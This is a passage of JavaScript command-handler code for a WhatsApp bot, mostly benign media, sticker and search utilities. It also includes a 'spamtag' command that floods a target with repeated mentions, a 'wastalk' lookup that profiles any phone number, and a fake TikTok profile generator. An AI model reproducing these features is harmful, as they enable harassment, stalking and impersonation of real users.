    await XReaction(); // Mengirim pesan 'wait' sementara proses berlangsung

    try {
        // Mengunduh dan menyimpan media dari pesan
        let media = await Alice.downloadAndSaveMediaMessage(qmsg);

        // Mengecek apakah tipe media adalah gambar, video, atau audio
        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            let url = await uploadToCatbox(media);
            reply(`${url}\nExpired: No Expired Date`);
        } else {
            reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
        }

        // Menghapus file setelah diunggah
        await fs.unlinkSync(media);
    } catch (err) {
        reply(`Error: ${err.message}`);
    }
}
break
case 'wm': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('text wm?')
await XReaction()
if (/image/.test(mime)) {
let media = await Alice.downloadMediaMessage(quoted)
let encmedia = await Alice.sendImageAsSticker(m.chat, media, m, { packname: `${text}`, author: ``  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await Alice.downloadMediaMessage(qmsg)
let encmedia = await Alice.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${XyrooRynzz}\nDurasi Video 1-9 Detik`)
}
}
break

case 'sticker':
case 'stiker':
case 's':{
if (isBan) return XRB()
await XReaction()
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${XyrooRynzz}`)
await XReaction()
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Alice.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 31) return reply('Maksimal 30 detik!')
let media = await quoted.download()
let encmedia = await Alice.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${XyrooRynzz}\nDurasi Video 1-9 Detik`)
}
}
break

case 'smeme': {
if (isBan) return XRB()
await XReaction()
  if (quoted) {
    let msg = quoted
    let type = Object.keys(msg)[0]
    if (msg[type].viewOnce && /image/.test(type)) {
      let media = await downloadContentFromMessage(msg[type], 'image')
      let buffer = Buffer.from([])
      for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
      }

      let awal = text.split('|')[0] || ''
      let akhir = text.split('|')[1] || ''
      const tempFile = `./temp_${Date.now()}.jpg`
      await fs.writeFileSync(tempFile, buffer)

    const { Smeme } = require('./AliceSystem/AliceScraper/smeme')
      let hasil = await Smeme(awal, akhir, tempFile)

      await Alice.sendImageAsSticker(m.chat, hasil, xy, {
      packname: `${pushname}`,
      author: `${author}`
      })

      await fs.unlinkSync(tempFile)
      return
    }
  }

  if (!/webp/.test(mime) && /image/.test(mime)) {
    let awal = text.split('|')[0] || ''
    let akhir = text.split('|')[1] || ''
    let mee = await Alice.downloadAndSaveMediaMessage(quoted)
    
    const { Smeme } = require('./AliceSystem/AliceScraper/smeme')
    let hasil = await Smeme(awal, akhir, mee)

    await Alice.sendImageAsSticker(m.chat, hasil, xy, {
      packname: `${pushname}`,
      author: `${author}`
    })
    await fs.unlinkSync(mee)
  } else {
    reply(`Kirim/kutip gambar dengan caption ${XyrooRynzz} memek|xyroo`)
  }
}
break

case 'hd': 
case 'hdr':
case 'remini':
case 'enchanced': {
if (isBan) return XRB()
await XReaction()
if (!isImage) return reply(`Balas/reply ${XyrooRynzz} Dengan Mengirim Gambar`)
 try {
 let media = await Alice.downloadAndSaveMediaMessage(quoted);
 let scale = await pxpic.create(media, 'upscale')
 let final = scale.resultImageUrl
await Alice.sendMessage(m.chat, { image: { url: final }, caption: `${packname}` }, { quoted: m})
} catch (error) {
  console.log(error)
  return reply('error')
 }
}
break
            
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Convert Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\


//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Tools Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'tocase': {
  const fs = require('fs')
  const path = require('path')
  if (!quoted || !quoted.text) return reply('❌ Reply ke plugin handler (ESM/CJS) yang mau diubah jadi case.');

  const code = quoted.text.trim();

  try {
    const cmdMatch = code.match(/handler\.command\s*=\s*\[(.*?)\]/);
    const bodyMatch = code.match(/let handler\s*=\s*async\s*\(.*?\)\s*=>\s*{([\s\S]+?)^\}/m) ||
                      code.match(/async function.*?\([\s\S]*?\)\s*{([\s\S]+?)^\}/m);

    if (!cmdMatch || !bodyMatch) return reply('❌ Tidak bisa mendeteksi struktur command atau isi fungsi.');

    const commands = cmdMatch[1].split(',').map(v => v.replace(/['"\[\]\s]/g, '')).filter(Boolean);
    const body = bodyMatch[1].trim();

    const result = commands.map(cmd => {
      return `case '${cmd}': {\n  ${body.replace(/\n/g, '\n  ')}\n}\nbreak;`;
    }).join('\n\n');

    // Jika hasil terlalu panjang (>4000 karakter), kirim sebagai file .js
    if (result.length > 4000) {
      const filename = `converted_case_${Date.now()}.js`;
      const filepath = path.join(__dirname, filename);
      fs.writeFileSync(filepath, result);

      await conn.sendMessage(m.chat, {
        document: fs.readFileSync(filepath),
        mimetype: 'application/javascript',
        fileName: filename
      }, { quoted: m });

      fs.unlinkSync(filepath); // hapus file setelah dikirim
    } else {
      reply('✅ Berikut hasil konversi:\n\n' + '```js\n' + result + '\n```');
    }

  } catch (e) {
    console.error(e);
    reply('❌ Gagal mengonversi plugin: ' + e.message);
  }
}
break;
case 'npm':
case 'npms':
case 'npmjs':
case 'npmshare':
case 'npmsearch': {
if (isBan) return XRB()
await XReaction()
                if (!text) return reply(`Masukkan nama package!\nContoh: ${XyrooRynzz} axios'`);
                let res = await fetch(`https://api.ditss.cloud/search/npm?apikey=DitssGanteng&q=${encodeURIComponent(text)}`);
                let json = await res.json();

                if (!json.result || !json.result.length) return reply('❌ Paket tidak ditemukan.');

                async function createImage(url) {
                    const {
                        imageMessage
                    } = await generateWAMessageContent({
                        image: {
                            url
                        }
                    }, {
                        upload: Alice.waUploadToServer
                    });
                    return imageMessage;
                }

                let cards = [];
                let data = json.result.slice(0, 10); // maksimal 10 paket

                for (let pkg of data) {
                    let npmLink = pkg.links?.npm || '';
                    let github = pkg.links?.repository?.replace(/^git\+/, '').replace(/\.git$/, '');
                    let img = 'https://raw.githubusercontent.com/ditss-dev/database/main/mbnojzwp.jpg'; // ikon NPM

                    cards.push({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `📦 ${pkg.title}\n📅 Update: ${pkg.update}\n👤 ${pkg.author}`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: 'NPM Search'
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: pkg.title,
                            hasMediaAttachment: true,
                            imageMessage: await createImage(img)
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📄 NPM",
                                        url: npmLink,
                                        merchant_url: npmLink
                                    })
                                },
                                github ? {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "🔗 GitHub",
                                        url: github,
                                        merchant_url: github
                                    })
                                } : null
                            ].filter(Boolean)
                        })
                    });
                }

                const msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `🔍 *Hasil Pencarian:* _${text}_`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: `powered by ${global.namaowner}`
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: false
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards
                                })
                            })
                        }
                    }
                }, {});

                await Alice.relayMessage(m.chat, msg.message, {
                    messageId: msg.key.id
                });
            }
            break
case 'getpastebin': 
case 'getpb': {
 if (!text) return reply(`🔗 Masukkan link pastebin`);

 try {
 const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(q)}`);
 const json = await res.json();
 if (!json.status) return reply(`⚠️ Gagal ambil data dari Pastebin.`);

 let content = json.result.content
 .split('\n')
 .filter(line => !line.trim().startsWith('//'))
 .join('\n');

 const isiPreview = content.length > 4000 ? content.slice(0, 4000) + '\n\n📌 Terpotong otomatis.' : content;

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 header: proto.Message.InteractiveMessage.Header.create({
 title: '📄 Pastebin Content',
 subtitle: 'Hasil dari link kamu',
 hasMediaAttachment: false
 }),
 body: { text: isiPreview },
 footer: { text: `Powered by ${botname}` },
 nativeFlowMessage: {
 buttons: [
 {
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: '📋 Salin Semua Isi',
 copy_code: content.slice(0, 10000)
 })
 }
 ]
 }
 })
 }
 }
 }, { userJid: m.chat, quoted: m });

 await Alice.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 } catch (err) {
 console.error(err);
 reply(`❌ Error: ${err.message}`);
 }
}
break
case 'ggist':
case 'getgist': {
if (isBan) return XRB()
await XReaction()
 if (!text) return reply(`📌 Kirim ID atau URL Gist!\nContoh: ${XyrooRynzz} 4c2db6dca3ee1e5f3eac53bd31c2f4d7`);

 const gistId = text.includes('gist.github.com')
 ? text.split('/').pop().split('?')[0]
 : text.trim();

 try {
 const res = await fetch(`https://api.github.com/gists/${gistId}`);
 if (!res.ok) throw `Gist tidak ditemukan atau private.`;

 const json = await res.json();
 const files = json.files;
 const firstFile = Object.values(files)[0];

 if (!firstFile || !firstFile.content) throw `Isi Gist kosong atau file tidak bisa dibaca.`;

 const namaFile = firstFile.filename;
 const isiFile = firstFile.content;
 const gistUrl = json.html_url;

 const output = `📂 *Gist ID:* ${gistId}\n` +
 `📄 *Nama File:* ${namaFile}\n\n` +
 `📜 *Isi:* \n${isiFile.slice(0, 10000)}\n`;

 await Alice.sendMessage(m.chat, {
 text: output.trim(),
 footer: packname,
 interactiveButtons: [{
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: '📂 Copy Gist',
 copy_code: gistUrl
 })
 }]
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 reply(`❌ Gagal ambil Gist!\n📄 *Error:* ${err.message || err}`);
 }
}
break
case 'listapi': {
if (isBan) return XRB()
await XReaction()

    const axios = require('axios');
    const fs = require('fs');
    const dbPath = './AliceDatabase/fastapi-list.json';

    try {
        const { data } = await axios.get('https://fastrestapis.fasturl.cloud/api/endpoint');
        if (!data || !Array.isArray(data.result)) {
            return reply("❌ Gagal membaca format data. Tidak ditemukan array `result`.");
        }

        const endpoints = data.result;

        // 🔍 Auto-Kategori Berdasarkan Path
        const kategoriMap = {};
        for (const api of endpoints) {
            let kategori = api.endpoint.split('/')[1] || 'Lainnya';
            kategori = kategori.charAt(0).toUpperCase() + kategori.slice(1);
            if (!kategoriMap[kategori]) kategoriMap[kategori] = [];
            kategoriMap[kategori].push(api);
        }

        // 💾 Simpan dengan struktur: { AI: [...], Anime: [...], ... }
        fs.writeFileSync(dbPath, JSON.stringify(kategoriMap, null, 2));

        // 🧩 Buat tombol nativeFlow: 1 tombol per kategori
        const sections = [
            {
                title: '📁 Kategori Tersedia',
                rows: Object.entries(kategoriMap).map(([kategori, list]) => ({
                    header: `📦 ${kategori}`,
                    title: `${kategori} (${list.length} API)`,
                    id: `.getapi ${kategori}`
                }))
            }
        ];

        // 📄 Caption info saja, tidak ada list isi API di sini
        const totalApi = endpoints.length;
        const totalKategori = Object.keys(kategoriMap).length;
        const caption = `📚 *Daftar API berdasarkan Kategori*\n\nTerdapat *${totalApi}* API dari *${totalKategori}* kategori.\nKlik tombol di bawah untuk melihat daftar per kategori.\n\nGunakan *.getapi [nomor]* untuk melihat detail.`;

        const messageContent = {
            document: fs.readFileSync('./AliceMedia/image/Alice.png'),
            mimetype: "image/png",
            fileLength: 99999999999999,
            jpegThumbnail: fs.readFileSync('./AliceMedia/image/Alice.png'),
            fileName: `「 Alice Assistant 」`,
            caption,
            footer: packname,
            buttons: [
                {
                    buttonId: "action",
                    buttonText: { displayText: "📑 Pilih Kategori API" },
                    type: 4,
                    nativeFlowInfo: {
                        name: 'single_select',
                        paramsJson: JSON.stringify({
                            title: "Pilih Kategori API",
                            sections
                        })
                    }
                }
            ],
            contextInfo: {
                forwardingScore: 99999
            },
            viewOnce: true
        };

        await Alice.sendMessage(m.chat, messageContent, { quoted: m });

    } catch (err) {
        console.error("❌ Error in listapi:", err);
        return Alice.sendMessage(m.chat, { text: "⚠️ Terjadi kesalahan saat mengambil daftar API." });
    }
}
break
case 'getapi': {
if (isBan) return XRB()
await XReaction()

    const fs = require('fs');
    const path = './AliceDatabase/fastapi-list.json';
    const raw = await axios.get("https://fastrestapis.fasturl.cloud/api/endpoint");
    const apiData = raw.data.result;

    const index = parseInt(text);
    if (isNaN(index) || index < 1 || index > apiData.length) {
        return reply(`⚠️ Format: *.getapi [nomor]*\nContoh: *.getapi 5*`);
    }

    const api = apiData[index - 1];
    const url = `https://fastrestapis.fasturl.cloud${api.endpoint}`;

    return reply(
        `🔍 *Informasi Endpoint #${index}*\n\n` +
        `🌐 URL: ${url}\n` +
        `📦 Method: ${api.method}\n` +
        `🏷️ Tag: ${api.tags?.join(', ') || '-'}\n` +
        `📝 Summary: ${api.summary || '-'}\n` +
        `📖 Deskripsi:\n${api.description?.substring(0, 1000) || '-'}`
    );
}
break
case 'faketiktok': case 'tiktokfake': {
if (isBan) return XRB()
await XReaction()
  if (!text) {
    return Alice.sendMessage(m.chat, {
      text: `*Fake TikTok Profile Generator*\n\n` +
            `Kirim perintah dengan format:\n` +
            `*${XyrooRynzz}* Nama|Username|Followers|Following|Likes|Bio|Verified(true/false)|isFollow(true/false)|dark/light\n\n` +
            `Contoh:\n` +
            `*${XyrooRynzz}* Apa Kek|Yubi|4020030|12|789000|Beginner in coding, but I love it! Follow me for more coding tips and tricks.|true|true|dark`
    }, { quoted: m });
  }
  let [name, username, followers, following, likes, bio, verified = 'true', isFollow = 'true', dark = 'true'] = text.split('|')
  if (!name || !username || !followers || !following || !likes || !bio) {
    return reply('Format salah.\nCoba ikuti contoh:\nNama|Username|Followers|Following|Likes|Bio|Verified|isFollow|Theme')
  }
  let ppUrl = await Alice.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg')
  let apiUrl = `https://flowfalcon.dpdns.org/imagecreator/faketiktok?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&pp=${encodeURIComponent(ppUrl)}&verified=${verified}&followers=${followers}&following=${following}&likes=${likes}&bio=${encodeURIComponent(bio)}&dark=${dark}&isFollow=${isFollow}`

  try {
const axios = require('axios');
    let { data } = await axios.get(apiUrl, { responseType: 'arraybuffer' })
    const buffer = Buffer.from(data)
    const FormData = (await import('form-data')).default
    const form = new FormData()
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', buffer, 'tiktokfake.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    if (!upres.data || !upres.data.includes('catbox')) return reply('Gagal upload gambar.')
    Alice.sendMessage(m.chat, {
      image: { url: upres.data }
    }, { quoted: m })
  } catch (e) {
    console.error(e)
    reply('Terjadi kesalahan saat membuat gambar.')
  }
}
  break
case 'phlogo': {
if (isBan) return XRB()
await XReaction()
  if (!text || !text.includes('|')) {
    return reply(`Masukkan dua teks dipisah dengan "|"\nContoh: *${XyrooRynzz} Xyroo|Rynzz*`)
  }

  let [text1, text2] = text.split('|').map(t => t.trim())
  if (!text1 || !text2) return reply('Kedua teks harus diisi!')

  try {
    const apiUrl = `https://apikey.sazxofficial.web.id/api/imagecreator/pornhub?text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
    const res = await fetch(apiUrl)
    const json = await res.json()

    if (!json.status) return reply('Gagal mengambil gambar dari API.')

    await Alice.sendMessage(m.chat, {
      image: { url: json.result },
      caption: `✅ *Berhasil membuat logo Pornhub*\n\n• *Text1:* ${text1}\n• *Text2:* ${text2}`,
      contextInfo: {
        externalAdreply: {
          title: "Pornhub Logo Generator",
          body: packname,
          thumbnailUrl: thumb,
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: json.result
        }
      }
    }, { quoted: m })

  } catch (e) {
    reply('Terjadi kesalahan saat memproses permintaan.')
    console.error(e)
  }
}
break
case 'scweb':
case 'gethtml': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Contoh: ${XyrooRynzz} https://example.com`);

    try {
        let res = await fetch(text);
        if (!res.ok) return reply('❌ Gagal mengambil data dari URL tersebut');
        let html = await res.text();

        const filePath = path.join(__dirname, './tmp/html_dump.html');
        fs.writeFileSync(filePath, html);

        await Alice.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'text/html',
            fileName: 'source.html'
        }, { quoted: m });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        reply('❌ Terjadi kesalahan saat mengambil HTML\n'+e.message);
    }
}
break
case 'texttonote': {
  if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`Example : ${XyrooRynzz} Nama|Kelas|Mata Pelajaran|Tanggal|Isi Catatan`)
  let [name, classroom, subject, date, ...content] = text.split('|')
  if (!name || !classroom || !subject || !date || content.length == 0) {
    return reply(`Format salah!\nContoh:\n${XyrooRynzz} Xyroo|XII - Bio A|Sexual Organs|2025-01-25|Isi catatan...`)
  }

  let contentEncoded = encodeURIComponent(content.join('|').trim())
  let url = `https://fastrestapis.fasturl.cloud/tool/texttonote?name=${encodeURIComponent(name)}&classroom=${encodeURIComponent(classroom)}&subject=${encodeURIComponent(subject)}&date=${encodeURIComponent(date)}&content=${contentEncoded}`

  try {
    await Alice.sendMessage(m.chat, {
      image: { url },
      caption: `Catatan untuk ${subject} berhasil dibuat!`
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    reply('Gagal membuat catatan, pastikan format dan isi valid.')
  }
}
  break
  case 'removebg' : {
if (isBan) return XRB()
await XReaction()
    if (!m.quoted || !m.quoted.download) {
        return reply(`Balas sebuah gambar dengan perintah *${XyrooRynzz}* untuk menghapus background.`);
    }

async function removebg(buffer) {
    try {
        return await new Promise(async (resolve, reject) => {
            const image = buffer.toString("base64");
            let res = await axios.post(
                "https://us-central1-ai-apps-prod.cloudfunctions.net/restorePhoto", {
                    image: `data:image/png;base64,${image}`,
                    model: "fb8af171cfa1616ddcf1242c093f9c46bcada5ad4cf6f2fbe8b81b330ec5c003",
                },
            );
            const data = res.data?.replace(`"`, "");
            console.log(res.status, data);
            if (!data) return reject("failed removebg image");
            resolve(data);
        });
    } catch (e) {
        return {
            msg: e
        };
    }
}

    try {
        const buffer = await m.quoted.download();
        const result = await removebg(buffer);

        if (typeof result === 'string') {
            await Alice.sendMessage(m.chat, { image: { url: result }, caption: "Berhasil menghapus latar belakang!" }, { quoted: m });
        } else {
            return reply(`${result.msg}`) || "Gagal menghapus latar belakang.";
        }
    } catch (err) {
        console.error(err);
       return reply(`Terjadi kesalahan: ${err.msg || err}`);
    }
};
break

case 'wastalk' : {
if (isBan) return XRB()
await XReaction()
let regionNames = new Intl.DisplayNames(['en'], { type: 'region' })
	let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	if (!num) return reply(`*• Example:* ${XyrooRynzz} *[Number]*`)
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await Alice.onWhatsApp(num))[0]?.exists) return reply('User not exists')
	let img = await Alice.profilePictureUrl(num, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png')
	let bio = await Alice.fetchStatus(num).catch(_ => { })
	let name = await Alice.getName(num)
	let business = await Alice.getBusinessProfile(num)
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `*[ WhatsApp Stalk ]*\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `*[ WhatsApp Business Stalk ]*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Descripcion* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
	img ? await Alice.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : reply(wea)
}
break

case'ceklinkgc':{
if (isBan) return XRB()
await XReaction()
    const iidgc = budy.match('@g.us')
    if(!iidgc)return reply(`Sertakan IdGroup Dengan Benar\nExample : ${XyrooRynzz} 120.......@g.us`)
    try{
    const gc = "https://chat.whatsapp.com/" + await Alice.groupInviteCode(text)
await reply(`${gc}`)
        }catch(e){
            reply('IdGroup Tidak Valid!!')
        }
}
break
case 'nulis': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`✏️ Contoh penggunaan:
.nulis Teks yang ingin ditulis
.nulis Teks|No
.nulis Teks|No|Tanggal

📌 Keterangan:
- Gunakan tanda "|" untuk memisahkan teks, nomor, dan tanggal (jika ada).
- Nomor dan tanggal bersifat OPSIONAL, boleh diisi atau dikosongkan.

🧪 Contoh valid:
.nulis Ini catatan harian
.nulis Ini catatan harian|2
.nulis Ini catatan harian|2|20 Juni 2025
.nulis Ini catatan harian||20 Juni 2025
`);
  // Pecah input berdasarkan tanda |
  let [isi, no, date] = text.split('|');
  isi = isi?.trim();
  no = no?.trim() || '';
  date = date?.trim() || '';

  if (!isi) return reply('⚠️ Isi tulisan tidak boleh kosong.');

  const api = `https://api.ditss.cloud/imgcreator/nulis2?text=${encodeURIComponent(isi)}&no=${encodeURIComponent(no)}&date=${encodeURIComponent(date)}`;

  try {
    await Alice.sendMessage(m.chat, { image: { url: api }, caption: `📝 Hasil tulisan:\n"${isi}"` }, { quoted: m });
  } catch (err) {
    console.error(err);
    reply('❌ Gagal membuat gambar. Pastikan server aktif atau teks tidak terlalu panjang.');
  }
}
break;
      case "nulis2":
if (isBan) return XRB()
await XReaction()
    if (!text)return reply(`Sertakan Text!!\nExample : ${XyrooRynzz} haloo bagaimana hari ini`)
          try {
            Alice.sendMessage(m.chat, {
              image: {
                url: `https://www.velyn.biz.id/api/tools/tulisbuku?prompt=${encodeURIComponent(text)}`
              },
              caption: "donee.."
            }, {
              quoted: m
            });
          } catch {
            reply("yah Error kak laporankan ke owner agar di perbaiki");
          }
        break;
case 'codegen': {
if (isBan) return XRB()
await XReaction()
  if (!text) return reply(`*Contoh penggunaan:*\n${XyrooRynzz} Fungsi untuk menghitung luas segitiga|Python`)

  let [prompt, language] = text.split("|").map(v => v.trim());

  if (!prompt || !language) {
    return reply(
      `*Format salah!*\nGunakan format seperti ini:\n` +
      `.${XyrooRynzz} <prompt>|<bahasa>\n\n` +
      `Contoh:\n.${XyrooRynzz} Cek bilangan prima|JavaScript`
    );
  }

  try {
    const payload = {
      customInstructions: prompt,
      outputLang: language
    };

    const { data } = await axios.post("https://www.codeconvert.ai/api/generate-code", payload);

    if (!data || typeof data !== "string") {
      return reply("Gagal mengambil hasil dari API.");
    }

    reply(
      `*Kode Hasil (${language}):*\n` +
      "```" + language.toLowerCase() + "\n" +
      data.trim() +
      "\n```"
    );

  } catch (error) {
    console.error(error);
    reply("Terjadi kesalahan saat memproses permintaan.");
  }
};
break
case 'spamtag': {
if (isBan) return XRB()
await XReaction()
  if (!m.isGroup) return reply('Perintah ini hanya bisa digunakan di dalam grup!')
  if (!text.includes('|')) return reply('Format salah!\nGunakan: .spamtag 628xxx/@tag|jumlah|pesan')

  let [targetRaw, jumlahRaw, ...pesanArray] = text.split('|')
  let jumlah = parseInt(jumlahRaw.trim())
  let pesan = pesanArray.join('|').trim()

  if (!targetRaw || isNaN(jumlah) || jumlah < 1 || !pesan)
    return reply('Format salah!\nGunakan: .spamtag 628xxx/@tag|jumlah|pesan')

  let target = targetRaw.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  const chatId = m.chat

  // Inisialisasi kalau belum ada
  if (!Alice.spamStatus) Alice.spamStatus = {}
  Alice.spamStatus[chatId] = true

  for (let i = 1; i <= jumlah; i++) {
    if (!Alice.spamStatus[chatId]) break
    await Alice.sendMessage(chatId, {
      text: `[#${i}] ${pesan}\n@${target.split('@')[0]}`,
      mentions: [target]
    }, { quoted: m })
    await new Promise(res => setTimeout(res, 1000))
  }

  delete Alice.spamStatus[chatId]
}
break

case 'stopspam': {
if (isBan) return XRB()
await XReaction()
  if (!m.isGroup) return reply('Perintah ini hanya bisa digunakan di dalam grup!')
  if (!Alice.spamStatus) Alice.spamStatus = {}

  const chatId = m.chat
  if (Alice.spamStatus[chatId]) {
    delete Alice.spamStatus[chatId]
    reply('Spam tag berhasil dihentikan!')
  } else {
    reply('Tidak ada spam tag yang sedang berjalan.')
  }
}
break

case 'txt2pixel' : {
    if (!text) return reply(`Mencari apa?\n\nContoh : ${XyrooRynzz} a girl`)
    await XReaction()
    let j = await txt2.pixel(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

case 'txt2ghibli' : {
    if (!text) return reply(`Prompt?\n\nContoh : ${XyrooRynzz} a girl`)
    await XReaction()
    let j = await txt2.ghibli(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

case 'txt2anime' : {
    if (!text) return reply(`Prompt?\n\nContoh : ${XyrooRynzz} a girl`)
    await XReaction()
    let j = await txt2.anime(text)
    Alice.sendMessage(m.chat, {
        image: { 
            url: j
        },
        caption: `prompt: ${text}`
    }, { quoted: m })
}
break

            case "tocode": {
                if (!text && !m.quoted) return reply(`\nreply something, then enter the file name, example: ${XyrooRynzz} yaya\n`);
                let fullFileName = `c-${text}.js`;
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);

                const HeaderType = {
                    UNKNOWN: 0,
                    EMPTY: 1,
                    TEXT: 2,
                    DOCUMENT: 3,
                    IMAGE: 4,
                    VIDEO: 5,
                    LOCATION: 6
                };

                const ButtonType = {
                    UNKNOWN: 0,
                    RESPONSE: 1,
                    NATIVE_FLOW: 2
                };
                
                let result;
                if (quotedType === 'liveLocationMessage') {
                    result = ` 
let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, {
    viewOnceMessage: {
      message: ${penis}
    }
  }, {})
}

handler.help = ["c${text}"]
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`;
                } else if (quotedType === 'buttonsMessage') {
                    let buttonsMessage = {};
                    let headerType = HeaderType.UNKNOWN;
                    let buttonType = ButtonType.RESPONSE;
                    result = `
let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, {
    viewOnceMessage: {
      message: ${penis}
    }
  }, {})
}

handler.help = ["c${text}"]
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`;
                } else {
                    result = `

let handler = async (m, { Alice, prefix, reply }) => {
  Alice.relayMessage(m.chat, ${penis}, {})
}

handler.help = ['c${text}']
handler.tags = ['copy']
handler.command = ["${text}"]
handler.owner = true

module.exports = handler
`
}
                function convertToNumbers(message) {
                    if (message?.buttonsMessage) {
                        message.buttonsMessage.headerType = HeaderType[message.buttonsMessage.headerType] || HeaderType.UNKNOWN;
                        if (message.buttonsMessage.buttons) {
                            message.buttonsMessage.buttons = message.buttonsMessage.buttons.map(button => {
                                button.type = ButtonType[button.type] || ButtonType.RESPONSE;
                                return button;
                            });
                        }
                    }
                    return message;
                }
      
                const message = JSON.parse(penis);
                const convertedMessage = convertToNumbers(message);
                let updatedPenis = JSON.stringify({ [quotedType]: convertedMessage[quotedType] }, null, 2);
                
                if (!fs.existsSync('./AlicePlugins')) {
                    fs.mkdirSync('./AlicePlugins');
                }
                
                fs.writeFileSync(`./AlicePlugins/${fullFileName}`, result.trim().replace(penis, updatedPenis));
                reply(`file ${fullFileName} successfully created in plugins folder`);
            }
            break;

            case "reactch": { 
if (isBan) return XRB()
await XReaction()
                if (!text) return reply(`${XyrooRynzz} < ch url > 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                Alice.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    Alice.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
                reply(`sukses mengirimkan custom reaction ke channel tersebut`)
            }
            break;

			case 'getinfogc':
            case 'cekidgc':
			case 'getinfogrup':
			case 'getgc': {
if (isBan) return XRB()
